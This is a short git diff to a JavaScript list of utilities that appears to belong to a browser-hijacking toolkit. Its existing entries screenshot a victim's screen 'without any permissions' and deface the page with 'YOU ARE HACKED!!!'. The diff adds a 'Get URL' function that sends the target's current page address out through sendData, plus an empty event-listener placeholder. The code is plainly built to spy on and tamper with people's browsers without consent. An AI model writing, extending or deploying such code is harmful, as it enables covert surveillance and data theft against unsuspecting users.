@@ -30,6 +30,10 @@ const utils = [
     name: "Screenshot",
     description: "Takes the screenshot of the user's browser screen (whatever they are looking at), and saves it in your system. Works WITHOUT ANY PERMISSIONS!!!",
     func: () => {
+      document.addEventListener('DOMContentLoaded', function() {
+        // your code here
+     }, false);
+     
       html2canvas(document.body, {
         allowTaint: true,
         useCORS: true,
@@ -69,6 +73,18 @@ const utils = [
       document.body.innerHTML = "<h1 style='color: red; font-size: 150px; text-align: center;'>YOU ARE HACKED!!!</h1>"
     }
   },
+
+
+
+  {
+    name: "Get URL",
+    description: "Gets the URL of the page target visits",
+    func: async () => {
+      await sendData(window.location.href);
+    }
+  },
+
+
 
 ]
 
